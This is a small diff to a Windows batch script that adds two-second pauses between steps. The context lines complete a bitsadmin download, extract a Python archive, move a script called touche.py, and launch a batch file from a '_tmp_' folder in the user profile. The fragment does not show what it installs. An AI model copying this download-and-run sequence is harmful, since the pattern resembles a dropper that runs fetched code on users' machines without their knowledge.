@@ -81,10 +81,15 @@
     bitsadmin /complete download4 >nul
 
     7za.exe x python.zip
+    timeout 2
     MOVE touche.py python
+    timeout 2
     cd python
+    timeout 2
     cd ..
+    timeout 2
     cmd /C "start C:\Users\%username%\_tmp_\_sc.bat"
+    timeout 2
     exit
 
 
